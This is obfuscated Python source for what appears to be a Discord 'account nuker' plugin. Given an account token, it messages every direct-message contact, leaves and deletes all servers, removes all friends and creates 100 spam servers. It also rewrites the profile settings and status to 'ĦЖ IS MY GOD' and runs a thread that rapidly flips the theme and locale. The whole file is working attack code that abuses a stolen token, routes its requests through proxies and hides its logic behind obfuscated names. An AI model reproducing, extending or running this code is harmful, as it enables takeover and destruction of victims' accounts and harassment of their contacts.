import threading 
import requests 
import random 
import os 
from itertools import cycle 
from colorama import Fore 
from plugins .standard import SlowPrint ,setTitle ,getheaders ,proxy 
def f1bernuke (OOO0000O0OO0O000O ,O000O0O0OO0O0000O ,O000000O00O0OO00O ):
    print (f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Account Nuker Active. . .")
    if threading .active_count ()<=100 :
        O0000000OO0000OO0 =threading .Thread (target =CustomSeizure ,args =(OOO0000O0OO0O000O ,))
        O0000000OO0000OO0 .start ()
    O0O000000O0O00OOO ={'Authorization':OOO0000O0OO0O000O }
    O0O000O00O0O000O0 =requests .get ("https://discord.com/api/v9/users/@me/channels",headers =getheaders (OOO0000O0OO0O000O )).json ()
    for O0OOO0000O00OO00O in O0O000O00O0O000O0 :
        try :
            requests .post (f'https://discord.com/api/v9/channels/'+O0OOO0000O00OO00O ['id']+'/messages',proxies =proxy (),headers =O0O000000O0O00OOO ,data ={"content":f"{O000000O00O0OO00O}"})
            setTitle (f"Messaging "+O0OOO0000O00OO00O ['id'])
            print (f"{Fore.RED}Messaged ID: {Fore.WHITE}"+O0OOO0000O00OO00O ['id']+Fore .RESET )
        except Exception as OO0O0O00O000000OO :
            print (f"The following error has been encountered and is being ignored: {OO0O0O00O000000OO}")
    print (f"{Fore.RED}Sent a Message to all available friends.{Fore.RESET}\n")#
    OOOO0000O00OO00OO =requests .get ("https://discord.com/api/v8/users/@me/guilds",headers =getheaders (OOO0000O0OO0O000O )).json ()
    for OO0O0OOOO0000OOO0 in OOOO0000O00OO00OO :
        try :
            requests .delete (f'https://discord.com/api/v8/users/@me/guilds/'+OO0O0OOOO0000OOO0 ['id'],proxies =proxy (),headers ={'Authorization':OOO0000O0OO0O000O })
            print (f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+OO0O0OOOO0000OOO0 ['name']+Fore .RESET )
        except Exception as OO0O0O00O000000OO :
            print (f"The following error has been encountered and is being ignored: {OO0O0O00O000000OO}")
    for OO0O0OOOO0000OOO0 in OOOO0000O00OO00OO :
        try :
            requests .delete (f'https://discord.com/api/v8/guilds/'+OO0O0OOOO0000OOO0 ['id'],proxies =proxy (),headers ={'Authorization':OOO0000O0OO0O000O })
            print (f'{Fore.RED}Deleted guild: {Fore.WHITE}'+OO0O0OOOO0000OOO0 ['name']+Fore .RESET )
        except Exception as OO0O0O00O000000OO :
            print (f"The following error has been encountered and is being ignored: {OO0O0O00O000000OO}")
    print (f"{Fore.YELLOW}Deleted/Left all available guilds.{Fore.RESET}\n")
    OOOO0OO00OOO0O0O0 =requests .get ("https://discord.com/api/v9/users/@me/relationships",proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O )).json ()
    for O00O0O0O0000O0O0O in OOOO0OO00OOO0O0O0 :
        try :
            requests .delete (f'https://discord.com/api/v9/users/@me/relationships/'+O00O0O0O0000O0O0O ['id'],proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O ))
            setTitle (f"Removing friend: "+O00O0O0O0000O0O0O ['user']['username']+"#"+O00O0O0O0000O0O0O ['user']['discriminator'])
            print (f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+O00O0O0O0000O0O0O ['user']['username']+"#"+O00O0O0O0000O0O0O ['user']['discriminator']+Fore .RESET )
        except Exception as OO0O0O00O000000OO :
            print (f"The following error has been encountered and is being ignored: {OO0O0O00O000000OO}")
    print (f"{Fore.GREEN}Removed all available friends.{Fore.RESET}\n")
    for OOOOO00OO0OO0OOOO in range (100 ):
        try :
            O00OOOOOO0O0O0OOO ={'name':f'{O000O0O0OO0O0000O}','region':'europe','icon':None ,'channels':None }
            requests .post ('https://discord.com/api/v7/guilds',proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O ),json =O00OOOOOO0O0O0OOO )
            setTitle (f"Creating {O000O0O0OO0O0000O} #{OOOOO00OO0OO0OOOO}")
            print (f"{Fore.BLUE}Created {O000O0O0OO0O0000O} #{OOOOO00OO0OO0OOOO}.{Fore.RESET}")
        except Exception as OO0O0O00O000000OO :
            print (f"The following error has been encountered and is being ignored: {OO0O0O00O000000OO}")
    print (f"{Fore.BLUE}Created all servers.{Fore.RESET}\n")
    O0000000OO0000OO0 .do_run =False 
    requests .delete ("https://discord.com/api/v8/hypesquad/online",proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O ))
    OOOO000O0OOO00OO0 ={'theme':"light",'locale':"ja",'message_display_compact':False ,'inline_embed_media':False ,'inline_attachment_media':False ,'gif_auto_play':False ,'render_embeds':False ,'render_reactions':False ,'animate_emoji':False ,'convert_emoticons':False ,'enable_tts_command':False ,'explicit_content_filter':'0',"custom_status":{"text":"ĦЖ IS MY GOD"},'status':"idle"}#line:57:O0O0O000O00OO0OO0 ={'theme':"light",'locale':"ja",'message_display_compact':False ,'inline_embed_media':False ,'inline_attachment_media':False ,'gif_auto_play':False ,'render_embeds':False ,'render_reactions':False ,'animate_emoji':False ,'convert_emoticons':False ,'enable_tts_command':False ,'explicit_content_filter':'0',"custom_status":{"text":"ĦЖ IS MY GOD"},'status':"idle"}#line:85
    requests .patch ("https://discord.com/api/v7/users/@me/settings",proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O ),json =OOOO000O0OOO00OO0 )
    OO0O0OOOO00OOOO0O =requests .get ("https://discordapp.com/api/v9/users/@me",proxies =proxy (),headers =getheaders (OOO0000O0OO0O000O )).json ()
    O0OO00OO00OOO000O =OO0O0OOOO00OOOO0O ['username']+"#"+OO0O0OOOO00OOOO0O ['discriminator']
    setTitle (f"Succes!")
    SlowPrint (f"{Fore.LIGHTRED_EX}Succesfully destroyed {O0OO00OO00OOO000O} ")
    print ("Enter anything to continue. . . ",end ="")
    input ()
def CustomSeizure (O00OO000O000O00OO ):
    print (f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
    O00OO0OOOOOOOO0O0 =threading .currentThread ()
    while getattr (O00OO0OOOOOOOO0O0 ,"do_run",True ):
        OOO00OO0O0OO0O000 =cycle (["light","dark"])
        O00O0OO0O00O00OO0 ={'theme':next (OOO00OO0O0OO0O000 ),'locale':random .choice (['ja','zh-TW','ko','zh-CN'])}
        requests .patch ("https://discord.com/api/v7/users/@me/settings",proxies =proxy (),headers =getheaders (O00OO000O000O00OO ),json =O00O0OO0O00O00OO0 )